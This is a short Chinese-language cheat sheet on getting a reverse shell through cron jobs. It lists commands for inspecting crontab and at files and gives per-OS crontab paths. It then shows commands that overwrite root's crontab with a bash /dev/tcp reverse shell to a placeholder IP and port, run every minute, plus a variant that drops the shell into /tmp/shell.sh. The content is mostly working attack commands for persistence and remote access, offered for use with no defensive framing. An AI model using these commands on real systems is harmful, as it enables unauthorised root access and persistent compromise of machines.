# 定时任务反弹shell

```bash
cat /etc/crontab
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

## 各系统定时任务文件位置

- CentOS/RedHat：`/var/spool/cron/`
- Ubuntu/Debian：`/var/spool/cron/crontabs/`
- FreeBSD：`/var/cron/tabs/`
- MacOS：`/usr/lib/cron/tabs/`

目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名

## 反弹shell

```bash
echo '* * * * * /bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1' > /var/spool/cron/crontabs/root
```

### [解决ubuntu-crontab反弹shell失败的问题](https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98)

```bash
echo '/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1' > /tmp/shell.sh
chmod +x /tmp/shell.sh
echo '* * * * * /tmp/shell.sh' > /var/spool/cron/crontabs/root
```
